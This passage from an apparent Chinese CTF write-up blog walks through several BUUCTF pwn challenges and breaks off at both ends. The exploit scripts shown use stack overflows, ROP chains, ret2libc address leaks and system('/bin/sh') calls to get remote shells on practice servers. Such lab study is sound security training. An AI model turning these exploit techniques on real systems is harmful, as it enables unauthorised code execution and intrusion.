class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment">#print hex(puts_addr)</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>放着！！！</p>
<p>okok <strong>2024.7.11 回来看一眼</strong>。看一眼多少位的，64位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28619</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x0000000000400c83</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004006b9</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(gets_addr))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031454447.png" alt="image-20240711200234031"></p>
<p>看一下偏移</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031454158.png" alt="image-20240711200300647"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">puts_addr=<span class="number">0x809c0</span></span><br><span class="line">str_bin_sh=<span class="number">0x1b3e9a</span></span><br><span class="line">system_addr=<span class="number">0x4f440</span></span><br></pre></td></tr></table></figure>

<p>完整如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28619</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x0000000000400c83</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004006b9</span></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gets_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(gets_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#params2</span></span><br><span class="line">puts_addr=<span class="number">0x809c0</span></span><br><span class="line">str_bin_sh=<span class="number">0x1b3e9a</span></span><br><span class="line">system_addr=<span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#构建libc</span></span><br><span class="line"></span><br><span class="line">libcbase = gets_addr - puts_addr</span><br><span class="line">system_addr = libcbase + system_addr</span><br><span class="line">bin_sh = libcbase + str_bin_sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>),ret_addr,pop_rdi,bin_sh,system_addr])</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031454778.png" alt="image-20240711200642122"></p>
<p>解决</p>
<p>flag{6e19bf44-20dc-4a65-862b-a334d541327e}</p>
<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>2024.6.22</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031454635.png" alt="image-20240622154316838"></p>
<p>32位框架，有NX保护机制</p>
<p>ida静态分析一下</p>
<p>main函数一个明显的gets函数，栈溢出</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455057.png" alt="image-20240622154712723"></p>
<p>再看看栈的结构,这里注意：<strong>这里有个细节，main中汇编代码没有push ebp，所以v4变量处写入0x38后就是返回地址</strong>，一般情况下是有的。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455383.png" alt="image-20240622211158253"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455435.png" alt="image-20240622211130729"></p>
<p>找一下溢出点</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455897.png" alt="image-20240622154922446"></p>
<p>猜测应该是这个。这里就是利用后门函数绕过if语句，直接溢出到要执行的地方！</p>
<p>所以构造payload。payload如下：</p>
<blockquote>
<p>payload&#x3D;”a”*0x38+p32(0x80489B8)</p>
</blockquote>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28751</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是我们发现我们得不到flag，猜测一下是没有flag.txt文件的过。</p>
<p>这里就采用别的方法。我们仔细看一下这个if判断语句，程序将a1和a2进行比较，所以我们可以同用get_flag函数覆盖，并将传递上这两个参数，就可以获得flag了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455715.png" alt="image-20240622205720135"></p>
<p>但是我们覆盖地址之后，有一个get_flag的返回地址，这里我们要换成exit函数，保持它的一个正常回显。因为只有正常的退出才能正确的回显flag。</p>
<p>所以就是’a’*0x38+ ‘ebp’ + get_flag + get_flag的返回地址 + 参数1 + 参数2</p>
<p>edp为无，get_flag返回的地址为exit（）函数的地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455078.png" alt="image-20240622211601542"></p>
<p>其返回地址为0x0804E6A0</p>
<p>在找一下get_flag的函数地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607920.png" alt="image-20240622211044133"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26959</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x38</span>+p32(<span class="number">0x080489A0</span>)+p32(<span class="number">0x806D7D1</span>)+p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455194.png" alt="image-20240623134249934"></p>
<p>最后也是得到flag了。</p>
<p>flag{bfcc083b-bb00-4371-938f-042f348745b3}</p>
<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>2024.6.23</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455501.png" alt="image-20240623134426772"></p>
<p>NX保护机制，64位架构，扔进ida静态分析一下</p>
<p>一进来就看见了system函数，找一下有没有溢出点</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607921.png" alt="image-20240623134741333"></p>
<p>看一下上面的函数，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455963.png" alt="image-20240623141052643"></p>
<p>所以就可以就可以溢出了</p>
<blockquote>
<p>payload&#x3D;’a’*0x88+p64(0x4006b3)+p64(0x600A90)+p64(0x4004C0)</p>
</blockquote>
<p>这里解释一下为什么是这样的？</p>
<p>64位程序函数调用时的操作和32位有所不同。32位程序函数调用时，依次将子函数的参数从右到左入栈，然后再压栈eip和ebp。64位程序如果子函数的参数数量&lt;&#x3D;6个，则会<strong>将参数从左到右依次存入rdi，rsi，rdx，rcx，r8，r9这6个寄存器中</strong>，如果还有参数，则像32位一样压栈。所以64位函数调用后，子函数运行时会先将参数从寄存器里pop出来，也就是会执行pop rdi; ret指令</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455213.png" alt="image-20240623142226592"></p>
<p>所以说我们首先就是要传入buf的128（0x80）位加上rbp的8位</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455863.png" alt="image-20240623142513555"></p>
<p>但是这里rdi;ret的地址我们是不知道的。所以</p>
<p>这里用工具查找一下</p>
<blockquote>
<p><strong>ROPgadget –binary .&#x2F;1111 –only “pop|ret”</strong></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031455012.png" alt="image-20240623143408644"></p>
<p>我们这里就得到了rdi；ret的地址为0x4006b3</p>
<p>之后的两个地址就比较好找了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456987.png" alt="image-20240623143825772"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456401.png" alt="image-20240623143846928"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26595</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x88</span>+p64(<span class="number">0x4006b3</span>)+p64(<span class="number">0x600A90</span>)+p64(<span class="number">0x4004C0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456464.png" alt="image-20240623144655012"></p>
<p>得到flag为</p>
<p>flag{511a6854-cb35-4ba6-9c90-c4394bf3b281}</p>
<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>2024.6.23</p>
<p>日常检查一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456654.png" alt="image-20240623182042927"></p>
<p>64位，NX保护。ida静态分析一下</p>
<p>main函数中可以看见</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456986.png" alt="image-20240623182318234"></p>
<p>猜测一下gadget应该是这个scanf函数，确定一下它的填充长度，长度为0x10+0x08（rbp）</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456307.png" alt="image-20240623182656629"></p>
<p>找一下&#x2F;bin&#x2F;sh，看一下它的地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456632.png" alt="image-20240623182843308"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607922.png" alt="image-20240623183432002"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607923.png" alt="image-20240623190901113"></p>
<p>这里要利用ROPgadgets工具找一下rdi的地址，</p>
<p>所以payload如下：</p>
<blockquote>
<p>payload&#x3D;’a’*0x18+p64(0x400683)+ p64(0x601048)+p64(0x400490)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29192</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x400683</span>)+ p64(<span class="number">0x601048</span>)+p64(<span class="number">0x400490</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>打通之后发现找不到flag，这里用命令找一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456948.png" alt="image-20240623191244980"></p>
<p>这回就可以直接cat了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat home/babyrop/flag</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456456.png" alt="image-20240623191424610"></p>
<p>flag{033f1e50-2264-4f73-8a72-fa8ec46c0790}</p>
<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>2024.6.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456763.png" alt="image-20240624173558706"></p>
<p>NX和PIE保护是开着的，32位</p>
<p>ida静态分析一下，发现没有什么我们以前见到的shell，system函数,这里补充小知识。</p>
<blockquote>
<p> 除了system(“&#x2F;bin&#x2F;sh”) 以外, 还有一种更好的方法, 就是系统调用中的 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)获得shell。我们可以在 Linxu系统调用号表 中找到对应的系统调用号,进行调用, 其中32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用。64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用。</p>
</blockquote>
<p>看了一眼，觉得shell应该藏在这个函数里。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456285.png" alt="image-20240624174218965"></p>
<p>其实看一了下wp，发现直接远程连接一下就可以cat了！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28011</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里他们说，题目通过将&#x2F;bin&#x2F;sh写入ebx。随后调用int80(sys_execve)系统调用</p>
<p>我们看一下汇编代码。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456408.png" alt="image-20240624193518927"></p>
<p>发现这里调用了eax寄存器，也就是<strong>int 80</strong>指令</p>
<p>看一下这个指令是干什么的eax&#x3D;0FFFFFFFFh。eax&#x3D;eax- 0FFFFFFF4h。所以说结果为11，正好对应着	</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031456610.png" alt="image-20240624193824777"></p>
<p>这里直接对照Linux系统调用表看看</p>
<p>找到对应的为,就是sys_execve的系统调用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define __NR_execve 11</span></span><br></pre></td></tr></table></figure>

<p>故此直接可以获得shell。</p>
<h3 id="Linux调用表"><a href="#Linux调用表" class="headerlink" title="Linux调用表"></a>Linux调用表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span 